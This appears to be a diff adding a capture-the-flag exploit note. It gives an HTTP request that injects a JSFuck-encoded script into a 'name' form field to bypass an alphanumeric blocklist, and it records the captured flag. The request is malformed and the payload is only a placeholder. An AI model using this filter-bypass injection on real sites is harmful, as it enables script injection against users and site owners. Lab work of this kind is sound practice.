@@ -1,0 +1,7 @@
+# Pure JSFuck payload bypasses all-alphanumeric+digit static blocklist. Replace JSFUCK_PAYLOAD with content of /tmp/jsfuck_payload2.txt
+
+GET /page HTTP/1.1
+Host: 172.17.0.1:46137
+Content-Length: 216
+
+POST /page HTTP/1.1\nHost: 172.17.0.1:46137\nContent-Type: application/x-www-form-urlencoded\n\nname=%22%3B[JSFUCK_PAYLOAD_FROM_/tmp/jsfuck_payload2.txt]%3B%2F%2F\n\n# Flag: flag{85085a7c-07be-43ea-ba89-3db5e7523235}
